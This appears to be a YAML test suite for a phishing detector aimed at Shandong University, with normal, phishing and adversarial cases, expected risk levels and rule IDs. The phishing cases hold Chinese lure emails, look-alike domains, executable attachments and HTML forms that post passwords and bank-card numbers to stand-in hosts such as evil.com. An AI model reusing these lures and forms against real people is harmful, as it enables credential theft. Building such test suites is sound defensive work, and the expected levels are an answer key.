@@ -1,0 +1,1036 @@
+cases:
+- id: N01
+  label: normal
+  input_type: email
+  input_text: 您好，本学期选课系统将于 9 月 15 日开放，请登录 https://sdu.edu.cn/course 查看课程安排。
+  context:
+    sender: registrar@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - DOMAIN_PUNYCODE_SUSPICIOUS
+  - URL_AT_SYMBOL
+  - EMAIL_SENDER_IMPERSONATION
+  description: 学校官方选课通知（官方域名+官方发件人）
+- id: N02
+  label: normal
+  input_type: email
+  input_text: 关于 2025 年度国家奖学金评审工作的通知已发布，详见附件。
+  context:
+    sender: xsc@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - ACCOUNT_DISABLE_THREAT
+  - URGENT_VERIFY_WORDING
+  description: 奖学金评审通知（纯文本无链接）
+- id: N03
+  label: normal
+  input_type: url
+  input_text: https://sdu.edu.cn/admissions/2025/schedule
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_IP_DOMAIN
+  - URL_AT_SYMBOL
+  - URL_NESTED_OFFICIAL_DOMAIN
+  description: 学校招生官网 URL
+- id: N04
+  label: normal
+  input_type: url
+  input_text: https://pass.sdu.edu.cn/cas/login?service=https://sdu.edu.cn/portal
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  description: 统一认证 CAS 登录
+- id: N05
+  label: normal
+  input_type: email
+  input_text: 实验室安全检查通知：请各位同学于本周五前完成实验室设备检查并提交报告至学院办公室。
+  context:
+    sender: lab-admin@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - TIME_LIMIT_PRESSURE
+  - REWARD_OR_REFUND_BAIT
+  description: 实验室安全检查（纯文本无链接）
+- id: N06
+  label: normal
+  input_type: text
+  input_text: 今天的课程改到线上，请大家准时参加。会议链接稍后发送。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  - ACCOUNT_DISABLE_THREAT
+  description: 课程通知（无链接无附件）
+- id: N07
+  label: normal
+  input_type: email
+  input_text: 您的工资条已生成，请登录人事系统 https://hr.sdu.edu.cn/payroll 查看。
+  context:
+    sender: hr@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  description: 人事工资条通知（官方子域名）
+- id: N08
+  label: normal
+  input_type: url
+  input_text: https://library.sdu.edu.cn/search?q=machine+learning
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  - URL_IP_DOMAIN
+  description: 图书馆搜索 URL
+- id: N09
+  label: normal
+  input_type: html
+  input_text: <html><body><h1>欢迎访问山东大学官网</h1><p>学校最新动态请关注<a href='https://sdu.edu.cn/news'>新闻中心</a></p></body></html>
+  expected_level: low
+  forbidden_rule_ids:
+  - LINK_TEXT_HREF_MISMATCH
+  - PORTAL_BRAND_EXTERNAL_DOMAIN
+  description: 学校官网页面（官方链接）
+- id: N10
+  label: normal
+  input_type: email
+  input_text: 宿舍报修申请已提交成功，维修人员将在两天内联系您。
+  context:
+    sender: dormitory@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 宿舍报修确认
+- id: N11
+  label: normal
+  input_type: text
+  input_text: 本周五下午 2 点在 4 号教学楼 302 教室举行班会，请准时参加。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  description: 班会通知
+- id: N12
+  label: normal
+  input_type: url
+  input_text: https://mail.qq.com/cgi-bin/loginpage
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - DOMAIN_KEYWORD_IMPERSONATION
+  - URL_NESTED_OFFICIAL_DOMAIN
+  description: QQ 邮箱登录页（外部但无品牌冒充）
+- id: N13
+  label: normal
+  input_type: email
+  input_text: 毕业论文格式审查已通过，请在知网查重系统中提交最终版本。链接：https://check.cnki.net
+  context:
+    sender: thesis@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 论文查重通知（外部链接为知网官方）
+- id: N14
+  label: normal
+  input_type: text
+  input_text: 食堂今日菜单：红烧肉、清炒西兰花、番茄蛋汤。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  - ACCOUNT_DISABLE_THREAT
+  - REWARD_OR_REFUND_BAIT
+  - CREDENTIAL_REQUEST_TEXT
+  description: 食堂菜单
+- id: N15
+  label: normal
+  input_type: email
+  input_text: 校园卡余额不足提醒：您的一卡通余额为 3.50 元，请及时充值。
+  context:
+    sender: card@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - REWARD_OR_REFUND_BAIT
+  description: 一卡通余额提醒
+- id: N16
+  label: normal
+  input_type: url
+  input_text: https://github.com/sdu-ai/phishing-detector
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_KEYWORD_IMPERSONATION
+  - URL_AT_SYMBOL
+  description: GitHub 开源项目（知名平台）
+- id: N17
+  label: normal
+  input_type: email
+  input_text: 关于举办 2025 年全国大学生数学建模竞赛校内选拔赛的通知。
+  context:
+    sender: math@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 竞赛通知（纯文本）
+- id: N18
+  label: normal
+  input_type: html
+  input_text: <html><body><h2>山东大学校历</h2><table><tr><td>秋季学期</td><td>2025年9月-2026年1月</td></tr></table></body></html>
+  expected_level: low
+  forbidden_rule_ids:
+  - PORTAL_BRAND_EXTERNAL_DOMAIN
+  - FORM_COLLECTS_SECRET
+  description: 校历页面
+- id: N19
+  label: normal
+  input_type: text
+  input_text: 请到行政楼 204 室取回代办的学生证。
+  expected_level: low
+  forbidden_rule_ids:
+  - CREDENTIAL_REQUEST_TEXT
+  description: 线下通知
+- id: N20
+  label: normal
+  input_type: email
+  input_text: 导师通知：周五组会取消，下周恢复正常。
+  context:
+    sender: professor@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 导师邮件
+- id: N21
+  label: normal
+  input_type: url
+  input_text: https://www.baidu.com/s?wd=山东大学
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - DOMAIN_KEYWORD_IMPERSONATION
+  description: 百度搜索（知名搜索引擎）
+- id: N22
+  label: normal
+  input_type: email
+  input_text: 关于寒假留校申请的通知，请于 1 月 10 日前在学工系统提交申请。
+  context:
+    sender: student-affairs@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - TIME_LIMIT_PRESSURE
+  description: 寒假留校通知
+- id: N23
+  label: normal
+  input_type: url
+  input_text: https://sdu.edu.cn/email
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_NON_HTTPS
+  description: 学校邮箱入口
+- id: N24
+  label: normal
+  input_type: email
+  input_text: 教育部关于开展 2025 年度本科教学工作审核评估的通知。
+  context:
+    sender: jiaoyubu@moe.gov.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - URGENT_VERIFY_WORDING
+  description: 教育部通知（gov.cn 官方域名）
+- id: N25
+  label: normal
+  input_type: text
+  input_text: 明天下雨，记得带伞。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  - ACCOUNT_DISABLE_THREAT
+  - REWARD_OR_REFUND_BAIT
+  - CREDENTIAL_REQUEST_TEXT
+  - SECURITY_UPGRADE_WORDING
+  description: 日常对话
+- id: N26
+  label: normal
+  input_type: html
+  input_text: <html><head><title>学术讲座</title></head><body><h1>人工智能前沿讲座</h1><p>时间：11月20日 14:00</p><p>地点：逸夫楼报告厅</p></body></html>
+  expected_level: low
+  forbidden_rule_ids:
+  - FORM_COLLECTS_SECRET
+  - PORTAL_BRAND_EXTERNAL_DOMAIN
+  description: 学术讲座页面
+- id: N27
+  label: normal
+  input_type: email
+  input_text: CVPR 2026 论文投稿截止日期延长至 3 月 20 日。详情见 https://cvpr.thecvf.com
+  context:
+    sender: conference@thecvf.com
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - TIME_LIMIT_PRESSURE
+  description: 学术会议通知
+- id: N28
+  label: normal
+  input_type: url
+  input_text: https://www.cnki.net/kcms/detail/11.1234.T.20250101.0000.001.html
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  description: 知网论文（知名学术平台）
+- id: N29
+  label: normal
+  input_type: email
+  input_text: 英语四六级考试成绩已公布，请登录中国教育考试网 https://cet.neea.edu.cn 查询。
+  context:
+    sender: cet@neea.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 四六级成绩通知
+- id: N30
+  label: normal
+  input_type: text
+  input_text: 请同学们在打印店门口排队，不要插队。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  description: 日常通知
+- id: N31
+  label: normal
+  input_type: email
+  input_text: 科技部关于发布国家重点研发计划项目申报指南的通知。
+  context:
+    sender: nstb@most.gov.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 科技部通知
+- id: N32
+  label: normal
+  input_type: url
+  input_text: https://www.weixin.qq.com
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  description: 微信官网
+- id: N33
+  label: normal
+  input_type: html
+  input_text: <html><body><h1>2025 校园招聘</h1><a href='https://job.sdu.edu.cn'>就业信息网</a></body></html>
+  expected_level: low
+  forbidden_rule_ids:
+  - LINK_TEXT_HREF_MISMATCH
+  - PORTAL_BRAND_EXTERNAL_DOMAIN
+  description: 校招页面（官方链接）
+- id: N34
+  label: normal
+  input_type: email
+  input_text: 请各位老师在教师节当天到行政楼签收慰问品。
+  context:
+    sender: union@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 教师节通知
+- id: N35
+  label: normal
+  input_type: text
+  input_text: 图书馆临时闭馆通知：因设备检修，12月3日全天闭馆。
+  expected_level: low
+  forbidden_rule_ids:
+  - TIME_LIMIT_PRESSURE
+  - ACCOUNT_DISABLE_THREAT
+  description: 图书馆通知
+- id: P01
+  label: phishing
+  input_type: email
+  input_text: 【紧急通知】您的统一认证账号出现异常登录，请立即点击 https://sdu-edu.cn/verify 验证身份，否则账号将在 24 小时内被冻结！
+  context:
+    sender: security@sdu-edu.cn
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  forbidden_rule_ids: []
+  description: 经典钓鱼：假冒域名 + 紧急验证 + 账号停用威胁
+- id: P02
+  label: phishing
+  input_type: email
+  input_text: 尊敬的用户，您的校园邮箱存储空间已满，请点击以下链接升级：http://mail-sdu.com/upgrade
+  context:
+    sender: admin@mail-sdu.com
+  expected_level: low
+  required_rule_ids:
+  - URL_NON_HTTPS
+  forbidden_rule_ids: []
+  description: 邮箱钓鱼：HTTP 链接 + 假冒域名
+- id: P03
+  label: phishing
+  input_type: html
+  input_text: <html><body><h2>统一认证系统</h2><form action='https://evil.com/steal'><input name='student_id' placeholder='学号'><input type='password' name='password' placeholder='密码'><input name='id_card' placeholder='身份证号'><button>登录</button></form></body></html>
+  base_url: https://sdu-edu.cn/login
+  expected_level: critical
+  required_rule_ids:
+  - PASSWORD_FORM_UNTRUSTED_TARGET
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  forbidden_rule_ids: []
+  description: 伪造登录页：多字段收集 + 外部域名 + base_url 应触发身份证据（critical_lock）
+- id: P04
+  label: phishing
+  input_type: email
+  input_text: 恭喜您获得山东大学年度奖学金 5000 元！请点击链接 https://bit.ly/sdu-scholarship 领取
+  context:
+    sender: award@sdu-scholarship.top
+  expected_level: low
+  required_rule_ids:
+  - URL_SHORT_LINK
+  - REWARD_OR_REFUND_BAIT
+  forbidden_rule_ids: []
+  description: 奖学金钓鱼：短链接 + 奖励诱导
+- id: P05
+  label: phishing
+  input_type: email
+  input_text: 【教务处】选课系统升级通知：请回复密码进行身份验证并完成系统迁移。
+  context:
+    sender: jiaowuchu@sdu-edu.org
+  expected_level: medium
+  required_rule_ids:
+  - CREDENTIAL_REQUEST_TEXT
+  forbidden_rule_ids: []
+  description: 凭据钓鱼：要求回复密码
+- id: P06
+  label: phishing
+  input_type: url
+  input_text: https://sdu.edu.cn.verify.phishing-site.com/login
+  expected_level: high
+  required_rule_ids:
+  - URL_NESTED_OFFICIAL_DOMAIN
+  forbidden_rule_ids: []
+  description: 嵌套官方域名在外部域名子域中
+- id: P07
+  label: phishing
+  input_type: email
+  input_text: 您好，信息技术中心检测到您的账号登录异常，系统将在 2 小时内停用账号，请立即完成安全验证 https://198.51.100.42/verify
+  context:
+    sender: support@fake-it-center.com
+  expected_level: medium
+  required_rule_ids:
+  - TIME_LIMIT_PRESSURE
+  - ACCOUNT_DISABLE_THREAT
+  - SECURITY_UPGRADE_WORDING
+  forbidden_rule_ids: []
+  description: IP 地址钓鱼 + 时间压力 + 账号停用威胁 + 假冒部门
+- id: P08
+  label: phishing
+  input_type: html
+  input_text: <html><body><meta http-equiv='refresh' content='0;url=https://evil.com/login'><p>正在跳转...</p></body></html>
+  expected_level: medium
+  required_rule_ids:
+  - META_REFRESH_REDIRECT
+  forbidden_rule_ids: []
+  description: meta refresh 重定向钓鱼
+- id: P09
+  label: phishing
+  input_type: url
+  input_text: https://pass.sdu.edu.cn@evil.com/login
+  expected_level: high
+  required_rule_ids:
+  - URL_AT_SYMBOL
+  forbidden_rule_ids: []
+  description: URL @ 符号欺骗：userinfo 伪装官方域名
+- id: P10
+  label: phishing
+  input_type: email
+  input_text: 【财务处】您有一笔 2000 元退税待领取，请在 24 小时内登录 https://sdu-tax-refund.com 填写银行卡信息。
+  context:
+    sender: caiwuchu@sdu-tax-refund.com
+  expected_level: medium
+  required_rule_ids:
+  - REWARD_OR_REFUND_BAIT
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 退税骗局：退款诱导 + 时间压力 + 银行卡信息
+- id: P11
+  label: phishing
+  input_type: html
+  input_text: <html><body><script>location.href='https://phishing-site.com/login'</script><p>loading...</p></body></html>
+  expected_level: low
+  required_rule_ids:
+  - JS_LOCATION_REDIRECT
+  forbidden_rule_ids: []
+  description: JS 重定向钓鱼
+- id: P12
+  label: phishing
+  input_type: email
+  input_text: 【学生处】助学贷款申请通知：请下载附件填写申请表。
+  context:
+    sender: student@apply-loan.xyz
+    attachments:
+    - 助学贷款申请表.pdf.exe
+  expected_level: high
+  required_rule_ids:
+  - ATTACHMENT_DOUBLE_EXTENSION
+  forbidden_rule_ids: []
+  description: 附件钓鱼：双重后缀可执行文件
+- id: P13
+  label: phishing
+  input_type: email
+  input_text: 系统安全升级：请扫描下方二维码登录验证。
+  context:
+    sender: admin@system-upgrade.info
+    qr_urls:
+    - https://evil.com/login?token=abc123
+  expected_level: medium
+  required_rule_ids:
+  - QR_CREDENTIAL_URL
+  forbidden_rule_ids: []
+  description: 二维码钓鱼：二维码指向外部登录页
+- id: P14
+  label: phishing
+  input_type: url
+  input_text: https://sdu-edu-cn.weebly.com/login
+  expected_level: low
+  required_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  forbidden_rule_ids: []
+  description: 免费托管平台仿冒域名
+- id: P15
+  label: phishing
+  input_type: email
+  input_text: 【信息技术中心】您的校园网账号即将过期，请在 30 分钟内登录 https://sdü-edu.cn/refresh 续期，否则将无法上网。
+  context:
+    sender: noc@sdü-edu.cn
+  expected_level: low
+  required_rule_ids:
+  - TIME_LIMIT_PRESSURE
+  forbidden_rule_ids: []
+  description: IDN 同形异义攻击域名 + 时间压力
+- id: P16
+  label: phishing
+  input_type: html
+  input_text: <html><body><a href='https://evil.com/login'>pass.sdu.edu.cn</a><br><a href='https://evil.com/verify'>login</a></body></html>
+  expected_level: medium
+  required_rule_ids:
+  - LINK_TEXT_HREF_MISMATCH
+  forbidden_rule_ids: []
+  description: 链接文字与目标不匹配
+- id: P17
+  label: phishing
+  input_type: html
+  input_text: <html><body><iframe src='https://evil.com/login' width='100%' height='600'></iframe></body></html>
+  expected_level: medium
+  required_rule_ids:
+  - IFRAME_LOGIN_PAGE
+  forbidden_rule_ids: []
+  description: iframe 嵌入外部登录页
+- id: P18
+  label: phishing
+  input_type: email
+  input_text: 【网络中心】校园网密码重置通知：请访问 http://sdu-reset.tk/reset 重置您的密码。
+  context:
+    sender: noc@sdu-reset.tk
+  expected_level: medium
+  required_rule_ids:
+  - URL_NON_HTTPS
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: HTTP 明文 + 可疑 TLD(.tk) + 假冒部门
+- id: P19
+  label: phishing
+  input_type: email
+  input_text: 请点击链接验证您的账号 https://sdu-edu.cn/sdu/login 否则账号将被注销。
+  context:
+    sender: fake@phish.cn
+  expected_level: low
+  required_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  forbidden_rule_ids: []
+  description: 可疑域名 + 注销威胁
+- id: P20
+  label: phishing
+  input_type: url
+  input_text: https://evil.com/sdu.edu.cn/login
+  expected_level: high
+  required_rule_ids:
+  - URL_NESTED_OFFICIAL_DOMAIN
+  forbidden_rule_ids: []
+  description: 官方域名嵌入外部域名路径中
+- id: P21
+  label: phishing
+  input_type: html
+  input_text: <html><body><form action='http://evil.com/collect'><input type='password' name='pass'><input name='bank_card'></form></body></html>
+  expected_level: high
+  required_rule_ids:
+  - FORM_NON_HTTPS_ACTION
+  - FORM_COLLECTS_SECRET
+  forbidden_rule_ids: []
+  description: 非 HTTPS 表单提交 + 密码 + 银行卡字段
+- id: P22
+  label: phishing
+  input_type: email
+  input_text: 您有一份重要通知请查看，附件为加密文档。
+  context:
+    sender: info@random-company.com
+    attachments:
+    - 重要通知.vbs
+  expected_level: high
+  required_rule_ids:
+  - ATTACHMENT_EXECUTABLE
+  forbidden_rule_ids: []
+  description: 恶意 VBS 脚本附件
+- id: P23
+  label: phishing
+  input_type: html
+  input_text: <html><body style='display:none'><form><input type='password' name='pwd'></form></body></html>
+  expected_level: low
+  required_rule_ids:
+  - FORM_COLLECTS_SECRET
+  forbidden_rule_ids: []
+  description: 隐藏表单收集密码
+- id: P24
+  label: phishing
+  input_type: email
+  input_text: 【教务处】学籍信息核对通知：请紧急登录 http://sdu-edu.cn:8443/check 核对学籍信息。
+  context:
+    sender: jiaowuchu@sdu-edu.cn
+  expected_level: medium
+  required_rule_ids:
+  - URL_NON_HTTPS
+  - URL_SUSPICIOUS_PORT
+  forbidden_rule_ids: []
+  description: 非标准端口 + 非 HTTPS + 假冒域名
+- id: P25
+  label: phishing
+  input_type: url
+  input_text: https://a.b.c.d.e.f.sdu.edu.cn.evil.com/login
+  expected_level: high
+  required_rule_ids:
+  - URL_LONG_SUBDOMAIN
+  - URL_NESTED_OFFICIAL_DOMAIN
+  forbidden_rule_ids: []
+  description: 多级子域名嵌套域名钓鱼
+- id: P26
+  label: phishing
+  input_type: email
+  input_text: 【山东大学】请立即点击下方链接完成校园卡认证：https://tinyurl.com/sdu-auth
+  context:
+    sender: card@short-link-service.com
+  expected_level: low
+  required_rule_ids: []
+  forbidden_rule_ids: []
+  description: 短链接钓鱼 + 品牌关键词（tinyurl 非已知短链）
+- id: P27
+  label: normal
+  input_type: html
+  input_text: <html><body><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="logo"><p>登录</p></body></html>
+  expected_level: low
+  allowed_levels:
+  - low
+  required_rule_ids: []
+  forbidden_rule_ids: []
+  description: 对抗：小 base64 图片（未达阈值），正常页面不应误报
+- id: P28
+  label: phishing
+  input_type: email
+  input_text: 【紧急】您的账号检测到风险，请马上登录 https://sdu.edu.cn.security-check.org/verify 修改密码
+  context:
+    sender: security@security-check.org
+  expected_level: high
+  required_rule_ids:
+  - URL_NESTED_OFFICIAL_DOMAIN
+  forbidden_rule_ids: []
+  description: 嵌套官方域名在外部域名子域 + 紧急话术
+- id: P29
+  label: phishing
+  input_type: email
+  input_text: 学校系统升级，请扫描二维码完成身份核验。
+  context:
+    sender: admin@sdu-verify.com
+    qr_urls:
+    - https://evil.com/auth/verify
+  expected_level: medium
+  required_rule_ids:
+  - QR_CREDENTIAL_URL
+  forbidden_rule_ids: []
+  description: 二维码外域凭据页
+- id: P30
+  label: phishing
+  input_type: html
+  input_text: <html><body><form><input name='username'><input type='password' name='pwd'><input name='sms_code'><input name='token'></form></body></html>
+  base_url: https://evil-phish.com/login
+  expected_level: medium
+  required_rule_ids:
+  - FORM_COLLECTS_SECRET
+  forbidden_rule_ids: []
+  description: 表单收集多重凭据字段
+- id: P31
+  label: phishing
+  input_type: url
+  input_text: https://sdu-login.temp.sit/auth
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_KEYWORD_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 可疑 TLD 域名含品牌+登录词
+- id: P32
+  label: phishing
+  input_type: email
+  input_text: 【信息技术中心】检测到您的 OA 系统密码过期，请访问 https://oa-sdu-system.com/password?user=sdu.edu.cn&redirect=https://sdu.edu.cn/oa 重置。
+  context:
+    sender: oa@oa-sdu-system.com
+  expected_level: medium
+  required_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: OA 钓鱼 + 参数中包含官方域名迷惑
+- id: P33
+  label: phishing
+  input_type: email
+  input_text: 请回复此邮件，提供您的姓名、学号、银行卡号和密码以办理校园卡退款。
+  context:
+    sender: refund@card-sdu.com
+  expected_level: low
+  required_rule_ids:
+  - REWARD_OR_REFUND_BAIT
+  forbidden_rule_ids: []
+  description: 邮件回复要求凭据
+- id: P34
+  label: phishing
+  input_type: url
+  input_text: https://sdu-auth-2025.servehttp.com/login
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_KEYWORD_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 动态 DNS 域名含品牌+认证词
+- id: P35
+  label: phishing
+  input_type: email
+  input_text: 【信息中心】您有新的安全消息，请下载安全证书更新工具：附件为 'SecurityUpdate.scr'
+  context:
+    sender: it@sdu-security.net
+    attachments:
+    - SecurityUpdate.scr
+  expected_level: high
+  required_rule_ids:
+  - ATTACHMENT_EXECUTABLE
+  forbidden_rule_ids: []
+  description: SCR 屏幕保护伪装附件
+- id: A01
+  label: phishing
+  input_type: email
+  input_text: 您好，这里是山 东 大 学信息技术中心，请 立 即 验 证 您的账号。
+  context:
+    sender: fake@evil.com
+  expected_level: low
+  required_rule_ids:
+  - URGENT_VERIFY_WORDING
+  forbidden_rule_ids: []
+  description: 对抗：关键字插空格（灵活匹配应穿透）
+- id: A02
+  label: phishing
+  input_type: email
+  input_text: 您好，这里是山​东​大​学信息技术中心，请立​即验​证您的账号。
+  context:
+    sender: fake@evil.com
+  expected_level: medium
+  required_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 对抗：关键字插零宽字符（灵活匹配应穿透）
+- id: A03
+  label: phishing
+  input_type: url
+  input_text: https://sdu-edu.cn/login
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  forbidden_rule_ids: []
+  description: 对抗：连字符变体域名仿冒
+- id: A04
+  label: normal
+  input_type: email
+  input_text: 您好，今天天气很好，适合出去走走。
+  context:
+    sender: friend@gmail.com
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  - ACCOUNT_DISABLE_THREAT
+  - EMAIL_SENDER_IMPERSONATION
+  - REWARD_OR_REFUND_BAIT
+  description: 对抗：完全无害的日常邮件
+- id: A05
+  label: normal
+  input_type: url
+  input_text: https://github.com/sdu-edu/phishing-detector
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - DOMAIN_KEYWORD_IMPERSONATION
+  - URL_AT_SYMBOL
+  description: 对抗：GitHub 包含 sdu-edu 但不是钓鱼
+- id: A06
+  label: phishing
+  input_type: email
+  input_text: 【信息技术中心】您的帐号存在安全风险，请重新认证：https://sdu-edu.xyz/auth
+  context:
+    sender: noreply@sdu-edu.xyz
+  expected_level: medium
+  required_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 对抗：'账号'故意用'帐号'
+- id: A07
+  label: normal
+  input_type: email
+  input_text: 请各位同学在 https://student.sdu.edu.cn/feedback 提交教学反馈。
+  context:
+    sender: feedback@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  description: 对抗：官方域名有登录/反馈但是正常请求
+- id: A08
+  label: phishing
+  input_type: html
+  input_text: <html><body><img src='img1.png'><img src='img2.png'><img src='img3.png'><img src='img4.png'><img src='img5.png'><img src='img6.png'></body></html>
+  expected_level: low
+  allowed_levels:
+  - low
+  required_rule_ids: []
+  forbidden_rule_ids: []
+  description: 对抗：纯图片页面（触发 HTML_IMAGE_ONLY_CONTENT）
+- id: A09
+  label: normal
+  input_type: url
+  input_text: https://sdu.edu.cn/students/login
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  description: 对抗：官方域名的登录路径（合法）
+- id: A10
+  label: phishing
+  input_type: email
+  input_text: 山 东 大 学 信 息 技 术 中 心 通 知：请 立 即 验 证 您 的 账 号 https://evil.com/login
+  context:
+    sender: admin@evil.net
+  expected_level: low
+  required_rule_ids:
+  - URGENT_VERIFY_WORDING
+  forbidden_rule_ids: []
+  description: 对抗：所有关键字插空格 + 品牌词空格拆分
+- id: A11
+  label: phishing
+  input_type: url
+  input_text: https://sdu.edu.cn.evil.com@evil.com/login
+  expected_level: high
+  required_rule_ids:
+  - URL_AT_SYMBOL
+  forbidden_rule_ids: []
+  description: 对抗：URL @ 符号混淆（sdu.edu.cn 在 userinfo 中）
+- id: A12
+  label: normal
+  input_type: email
+  input_text: 关于图书馆借阅超期的提醒：您有一本图书即将到期，请及时归还或续借。
+  context:
+    sender: library@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - TIME_LIMIT_PRESSURE
+  - URGENT_VERIFY_WORDING
+  description: 对抗：官方的'提醒'但不危险
+- id: A13
+  label: phishing
+  input_type: email
+  input_text: 【学校通知】请登录 https://sdu-portal-office365.com 验证您的 Office 365 教育版账号。
+  context:
+    sender: office365@sdu-portal-office365.com
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_KEYWORD_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 对抗：Office 365 钓鱼域名含品牌+认证词
+- id: A14
+  label: normal
+  input_type: html
+  input_text: <html><body><h1>通知</h1><p>本网站使用 https://sdu.edu.cn 的样式表</p><a href='https://sdu.edu.cn'>官网</a><a href='https://github.com'>GitHub</a></body></html>
+  expected_level: low
+  forbidden_rule_ids:
+  - LINK_TEXT_HREF_MISMATCH
+  - EXTERNAL_LINK_DOMINANCE
+  - PORTAL_BRAND_EXTERNAL_DOMAIN
+  description: 对抗：包含外链但以官方链接为主
+- id: A15
+  label: phishing
+  input_type: email
+  input_text: 请在下周之前完成账户审验，否则您的校园服务将被暂停。http://account-check.info
+  context:
+    sender: verify@account-check.info
+  expected_level: low
+  required_rule_ids:
+  - URL_NON_HTTPS
+  forbidden_rule_ids: []
+  description: 对抗：温和措辞但 HTTP + 可疑域名
+- id: A16
+  label: normal
+  input_type: text
+  input_text: 同学你好，昨天的作业请发到我的邮箱 teacher@qq.com
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  - URGENT_VERIFY_WORDING
+  - CREDENTIAL_REQUEST_TEXT
+  description: 对抗：包含邮箱地址的日常文本
+- id: A17
+  label: phishing
+  input_type: url
+  input_text: http://sdu-edu.cn:8443/login
+  expected_level: medium
+  required_rule_ids:
+  - URL_NON_HTTPS
+  - URL_SUSPICIOUS_PORT
+  forbidden_rule_ids: []
+  description: 对抗：非标准端口 + 非HTTPS + 连字符变体域名
+- id: A18
+  label: normal
+  input_type: email
+  input_text: 2025 年度教职工羽毛球比赛报名通知。请各分工会组织报名。
+  context:
+    sender: union@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 对抗：纯活动通知
+- id: A19
+  label: phishing
+  input_type: email
+  input_text: 【安全中心】您的 SDU 统一认证账号存在安全风险。请点击 https://tiny.cc/sdu-safety 进行安全加固。
+  context:
+    sender: help@safety-now.top
+  expected_level: low
+  required_rule_ids:
+  - SECURITY_UPGRADE_WORDING
+  forbidden_rule_ids: []
+  description: 对抗：品牌缩写 SDU + 短链接 + 安全话术
